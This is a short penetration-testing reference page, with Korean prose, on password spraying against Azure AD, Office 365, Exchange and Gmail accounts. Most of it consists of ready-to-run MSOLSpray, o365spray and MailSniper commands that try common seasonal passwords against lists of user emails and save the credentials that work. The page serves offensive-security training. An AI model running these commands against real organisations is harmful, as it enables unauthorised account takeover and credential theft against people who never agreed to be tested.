# Az - Password Spraying

{{#include ../../../banners/hacktricks-training.md}}

## Password Spray

**Azure**에서는 Azure AD Graph, Microsoft Graph, Office 365 Reporting 웹 서비스 등 **다양한 API 엔드포인트**에 대해 이 작업을 수행할 수 있습니다.

그러나 이 기술은 **매우 시끄럽고** Blue Team이 **쉽게 감지할 수** 있다는 점에 유의해야 합니다. 또한, **강제 비밀번호 복잡성**과 **MFA**의 사용은 이 기술을 다소 무용하게 만들 수 있습니다.

[**MSOLSpray**](https://github.com/dafthack/MSOLSpray)를 사용하여 비밀번호 스프레이 공격을 수행할 수 있습니다.
```powershell
. .\MSOLSpray\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\validemails.txt -Password Welcome2022! -Verbose
```
또는 [**o365spray**](https://github.com/0xZDH/o365spray) 사용하여
```bash
python3 o365spray.py --spray -U validemails.txt -p 'Welcome2022!' --count 1 --lockout 1 --domain victim.com
```
또는 [**MailSniper**](https://github.com/dafthack/MailSniper) 사용하여
```powershell
#OWA
Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile owa-sprayed-creds.txt
#EWS
Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt
#Gmail
Invoke-PasswordSprayGmail -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile gmail-sprayed-creds.txt
```
{{#include ../../../banners/hacktricks-training.md}}
